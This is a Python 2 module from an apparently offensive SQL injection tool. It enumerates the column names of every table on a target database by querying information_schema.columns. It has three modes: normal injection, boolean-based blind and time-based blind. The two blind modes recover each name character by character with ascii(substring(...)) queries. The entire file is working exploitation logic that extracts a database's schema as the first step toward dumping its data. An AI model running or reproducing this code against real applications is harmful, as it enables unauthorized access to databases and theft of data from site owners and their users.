#!/usr/bin/env python
# -*- coding:utf-8 -*-
from lib.dealpayload import build_injection
from lib.dealpayload import time_injection
from lib.dealpayload import normal_injection
from lib.log import logger
from tables import SqliTables
from tqdm import trange

__author__ = "LoRexxar"


class SqliColumns(SqliTables):
    def __init__(self):
        SqliTables.__init__(self)

    # 获取列名
    def get_columns(self):

        # 若tables_name未设置，则全跑一遍
        if len(self.tables_name) == 0:
            SqliTables.get_tables(self)

        # 首先是每个database_name
        for database_name in self.tables_name:

            # 每个databases_name声明为一个字典
            self.columns_name[database_name]={}

            # 每个table_name需要跑一次columns_name
            for table_name in self.tables_name[database_name]:

                # 每个table_name中的columns_name声明为一个列表储存
                columns_name = []

                # 开始跑columns_name
                logger.debug("Start sqli databases %s's tables %s's columns..." % (database_name, table_name))

                logger.debug("The sqlirequest is %s, start sqli columns..." % self.sqlirequest)

                if self.sqlimethod == "normal":

                    logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                    logger.debug("Start table's %s column amount sqli..." % table_name)

                    # 先注columns的数量

                    columns_number = normal_injection(select='COUNT(*)',
                                                      source="information_schema.columns",
                                                      conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                      dealpayload=self.dealpayload,
                                                      data=self.Data, isCount=True, sqlirequest=self.sqlirequest
                                                      )

                    logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                    logger.info("[*] columns_number: %d" % columns_number)

                    # 每个循环跑一次columns的数据
                    for i in trange(int(columns_number), desc="Column sqli...", leave=False, disable=True):
                        # 首先是column name的长度
                        logger.debug("Start %dth column length sqli..." % (i + 1))

                        column_name_len = normal_injection(select='length(column_name)',
                                                           source="information_schema.columns",
                                                           conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                           limit=i,
                                                           dealpayload=self.dealpayload,
                                                           data=self.Data, isCount=True, sqlirequest=self.sqlirequest
                                                           )

                        logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                        logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))

                        # 然后注columns name

                        column_name = normal_injection(select='column_name',
                                                       source='information_schema.columns',
                                                       conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                       limit=i,
                                                       dealpayload=self.dealpayload,
                                                       data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
                                                       )

                        logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))

                        # 把columns_name插入列表
                        columns_name.append(column_name)
                        logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))

                elif self.sqlimethod == "build":

                    logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                    logger.debug("Start table's %s column amount sqli..." % table_name)

                    retVal = build_injection(select="COUNT(column_name)",
                                             source="information_schema.columns",
                                             conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                             isCount=True, sqlirequest=self.sqlirequest)
                    columns_number = int(retVal)

                    logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                    logger.info("[*] columns_number: %d" % columns_number)

                    for i in range(0, int(columns_number)):
                        # 然后注 columns_number 的 length
                        logger.debug("Start %dth column length sqli..." % (i + 1))

                        retVal = build_injection(select="length(column_name)",
                                                 source="information_schema.columns",
                                                 conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                 limit=i,
                                                 dealpayload=self.dealpayload, data=self.Data,
                                                 lens=self.len,
                                                 isCount=True, sqlirequest=self.sqlirequest)
                        column_name_len = int(retVal)

                        logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                        logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))

                        # 然后注column名字
                        # 清空column_name
                        column_name = ""
                        logger.debug("Start %dth column sqli..." % (i + 1))

                        for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
                            retVal = build_injection(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
                                                     source="information_schema.columns",
                                                     conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                     limit=i,
                                                     dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                                     isStrings=True, sqlirequest=self.sqlirequest)
                            column_name += chr(retVal)

                        logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))

                        # 把columns_name插入列表
                        columns_name.append(column_name)
                        logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))

                elif self.sqlimethod == "time":

                    logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                    logger.debug("Start table's %s column amount sqli..." % table_name)

                    retVal = time_injection(select="COUNT(column_name)",
                                            source="information_schema.columns",
                                            conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                            isCount=True, sqlirequest=self.sqlirequest)
                    columns_number = int(retVal)

                    logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                    logger.info("[*] columns_number: %d" % columns_number)

                    for i in range(0, int(columns_number)):
                        # 然后注 columns_number 的 length
                        logger.debug("Start %dth column length sqli..." % (i + 1))

                        retVal = time_injection(select="length(column_name)",
                                                source="information_schema.columns",
                                                conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                limit=i,
                                                dealpayload=self.dealpayload, data=self.Data,
                                                times=self.time,
                                                isCount=True, sqlirequest=self.sqlirequest)
                        column_name_len = int(retVal)

                        logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                        logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))

                        # 然后注columns名字
                        # 清空column_name
                        column_name = ""
                        logger.debug("Start %dth column sqli..." % (i + 1))

                        for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
                            retVal = time_injection(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
                                                    source="information_schema.columns",
                                                    conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                    limit=i,
                                                    dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                                    isStrings=True, sqlirequest=self.sqlirequest)
                            column_name += chr(retVal)

                        logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))

                        # 把columns_name插入列表
                        columns_name.append(column_name)
                        logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))

                # 把注入得到的columns_name列表转为元组
                self.columns_name[database_name][table_name] = tuple(columns_name)
        logger.info("Sqli result:")
        # 输出所有的列名
        for database_name in self.columns_name:
            tables_name = ""
            for table_name in self.columns_name[database_name]:
                tables_name += table_name
                tables_name += ','
                columns_name = ""
                for column_name in self.columns_name[database_name][table_name]:
                    columns_name += column_name
                    columns_name += ','

                logger.info("Table %s has columns %s", table_name, columns_name)
            logger.info("Database %s has tables %s", database_name, tables_name)

        print "[*]Columns list:", self.columns_name
